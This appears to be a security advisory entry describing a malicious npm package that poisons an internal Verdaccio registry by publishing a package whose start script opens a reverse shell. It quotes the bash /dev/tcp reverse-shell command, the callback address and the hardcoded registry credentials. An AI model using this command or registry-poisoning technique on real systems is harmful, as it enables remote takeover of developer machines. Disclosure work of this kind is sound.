summary: Internal registry poisoning with reverse-shell payload
details: The package's exported `command` function authenticates to a Verdaccio registry at http://0.0.0.0:4873/ with hardcoded credentials (vert99/vert99pass), and publishes a package `uhclabs_local_check@1.0.5` whose npm `start` script is a bash reverse shell back to 10.0.0.145:9999 (`/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.145/9999 0>&1'`). A fallback path uses `npm adduser` + `execSync('npm publish...')` to create the account and publish the same payload if login fails. Any installer that imports this package and calls its exported function will poison the local internal package mirror with a reverse-shell-on-`npm start` package, enabling lateral movement to anyone who later installs from that mirror. The shape (loopback Verdaccio target, internal RFC1918 callback IP, hardcoded creds, reverse-shell start script) is an offensive attack tool, not a legitimate library.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
